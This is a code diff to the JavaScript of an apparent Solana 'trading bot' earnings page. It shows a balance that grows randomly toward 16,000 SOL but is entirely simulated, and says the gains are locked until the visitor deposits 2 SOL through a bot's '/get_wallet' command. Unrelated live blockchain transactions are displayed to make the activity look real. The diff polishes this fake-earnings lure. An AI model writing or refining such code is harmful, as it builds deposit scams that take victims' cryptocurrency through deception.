@@ -2,9 +2,12 @@ let currentBalance = 0;
 let startTime = new Date();
 let chart;
 
+const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+
 document.addEventListener("DOMContentLoaded", function() {
     initializeApp();
     setInterval(updateApp, 1000); // Update every second
+    setInterval(fetchRecentTransactions, 30000); // Fetch transactions every 30 seconds
 });
 
 function initializeApp() {
@@ -24,15 +27,19 @@ function updateApp() {
         initializeApp(); // Reset after 24 hours
     } else {
         updateTodayStats();
-        fetchRecentTransactions();
     }
 }
 
 function updateTodayStats() {
-    const elapsedTime = (new Date() - startTime) / 1000; // Time elapsed in seconds
-    const maxIncrease = 16000 - currentBalance; // Maximum possible increase
-    const increaseRate = maxIncrease / (24 * 60 * 60); // Increase rate per second
-    currentBalance += increaseRate * (Math.random() * 0.5 + 0.75); // Random increase between 75% and 125% of the average rate
+    const now = new Date();
+    const elapsedSeconds = (now - startTime) / 1000;
+    const totalSeconds = 24 * 60 * 60; // 24 hours in seconds
+    const progressRatio = elapsedSeconds / totalSeconds;
+    
+    const maxIncrease = 16000 - currentBalance;
+    const increase = maxIncrease * progressRatio * (0.5 + Math.random() * 0.5); // Random factor between 0.5 and 1
+    
+    currentBalance += increase;
 
     document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL`;
     document.getElementById("stats-description").textContent = 
@@ -47,64 +54,56 @@ function initializeWallet() {
 }
 
 function updateMyGains() {
-    document.getElementById("gains-message").innerHTML = 
-        "🔒 Locked: To access your gains, please deposit 2 SOL. Head to the bot and type <strong>/get_wallet</strong> to obtain your wallet and make the deposit. Unlock the potential of your earnings once you've activated your account!";
+    const gainsContent = document.getElementById("gains-content");
+    gainsContent.innerHTML = `
+        <span class="lock-icon">🔒</span>
+        <p id="gains-message">To access your gains, please deposit 2 SOL. Head to the bot and type <strong>/get_wallet</strong> to obtain your wallet and make the deposit. Unlock the potential of your earnings once you've activated your account!</p>
+    `;
 }
-
-const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
 
 async function fetchRecentTransactions() {
     try {
-        const recentBlockhash = await connection.getRecentBlockhash();
-        const recentBlock = await connection.getBlock(recentBlockhash.blockhash);
+        const signatures = await connection.getSignaturesForAddress(new solanaWeb3.PublicKey('Vote111111111111111111111111111111111111111'), { limit: 10 });
+        
+        const transactions = await Promise.all(signatures.map(async (sig) => {
+            const tx = await connection.getTransaction(sig.signature);
+            if (!tx) return null;
 
-        if (!recentBlock || !recentBlock.transactions) {
-            throw new Error("Failed to fetch recent block data");
-        }
+            const { transaction, meta } = tx;
+            const isTransfer = transaction.instructions.some(ix => 
+                ix.programId.equals(solanaWeb3.SystemProgram.programId));
+            const isSwap = transaction.instructions.some(ix => 
+                ix.programId.toBase58() === 'SwaPpA9LAaLfeLi3a68M4DjnLqgtticKg6CnyNwgAC8');
 
-        const processedTransactions = recentBlock.transactions
-            .filter(tx => tx.meta && !tx.meta.err)
-            .slice(0, 10) // Limit to 10 transactions
-            .map(tx => {
-                const { transaction, meta } = tx;
-                const isTransfer = transaction.message.instructions.some(ix => 
-                    ix.programId.equals(solanaWeb3.SystemProgram.programId));
-                const isSwap = transaction.message.instructions.some(ix => 
-                    ix.programId.toBase58() === 'SwaPpA9LAaLfeLi3a68M4DjnLqgtticKg6CnyNwgAC8');
+            let type, amount, fromAddress, toAddress;
 
-                let type, amount, fromAddress, toAddress;
+            if (isTransfer) {
+                type = 'transfer';
+                amount = meta.postBalances[0] - meta.preBalances[0];
+                fromAddress = transaction.instructions[0].keys[0].pubkey.toBase58();
+                toAddress = transaction.instructions[0].keys[1].pubkey.toBase58();
+            } else if (isSwap) {
+                type = 'swap';
+                amount = 'Token Swap';
+                fromAddress = transaction.instructions[0].keys[0].pubkey.toBase58();
+                toAddress = 'N/A';
+            } else {
+                type = 'other';
+                amount = 'Unknown';
+                fromAddress = transaction.instructions[0].keys[0].pubkey.toBase58();
+                toAddress = 'N/A';
+            }
 
-                if (isTransfer) {
-                    type = 'transfer';
-                    const transferIx = transaction.message.instructions.find(ix => 
-                        ix.programId.equals(solanaWeb3.SystemProgram.programId));
-                    if (transferIx) {
-                        amount = meta.postBalances[transferIx.accounts[1]] - meta.preBalances[transferIx.accounts[1]];
-                        fromAddress = transaction.message.accountKeys[transferIx.accounts[0]].toBase58();
-                        toAddress = transaction.message.accountKeys[transferIx.accounts[1]].toBase58();
-                    }
-                } else if (isSwap) {
-                    type = 'swap';
-                    amount = 'Token Swap';
-                    fromAddress = transaction.message.accountKeys[0].toBase58();
-                    toAddress = 'N/A';
-                } else {
-                    type = 'other';
-                    amount = 'Unknown';
-                    fromAddress = transaction.message.accountKeys[0].toBase58();
-                    toAddress = 'N/A';
-                }
+            return {
+                type,
+                amount: type === 'transfer' ? (Math.abs(amount) / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL' : amount,
+                time: new Date(tx.blockTime * 1000).toLocaleTimeString(),
+                fromAddress: fromAddress.slice(0, 4) + '...' + fromAddress.slice(-4),
+                toAddress: toAddress !== 'N/A' ? toAddress.slice(0, 4) + '...' + toAddress.slice(-4) : toAddress
+            };
+        }));
 
-                return {
-                    type,
-                    amount: type === 'transfer' ? (amount / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL' : amount,
-                    time: new Date().toLocaleTimeString(),
-                    fromAddress: fromAddress.slice(0, 4) + '...' + fromAddress.slice(-4),
-                    toAddress: toAddress !== 'N/A' ? toAddress.slice(0, 4) + '...' + toAddress.slice(-4) : toAddress
-                };
-            });
-
-        displayTransactions(processedTransactions);
+        displayTransactions(transactions.filter(tx => tx !== null));
     } catch (error) {
         console.error("Error fetching recent transactions:", error);
         document.getElementById("transactions-list").innerHTML = "Error fetching transactions";
@@ -153,7 +152,6 @@ function initializeStatsGraph() {
     chart = new Chart(ctx, {
         type: 'line',
         data: {
-            labels: [],
             datasets: [{
                 label: 'SOL Balance',
                 data: [],
@@ -172,9 +170,9 @@ function initializeStatsGraph() {
                 x: {
                     type: 'time',
                     time: {
-                        unit: 'hour',
+                        unit: 'minute',
                         displayFormats: {
-                            hour: 'HH:mm'
+                            minute: 'HH:mm'
                         }
                     },
                     ticks: {
@@ -205,11 +203,9 @@ function initializeStatsGraph() {
 
 function updateStatsGraph() {
     const now = new Date();
-    chart.data.labels.push(now);
-    chart.data.datasets[0].data.push(currentBalance);
-    if (chart.data.labels.length > 100) {
-        chart.data.labels.shift();
+    chart.data.datasets[0].data.push({x: now, y: currentBalance});
+    if (chart.data.datasets[0].data.length > 100) {
         chart.data.datasets[0].data.shift();
     }
-    chart.update();
+    chart.update('none'); // Update without animation for smoother updates
 }
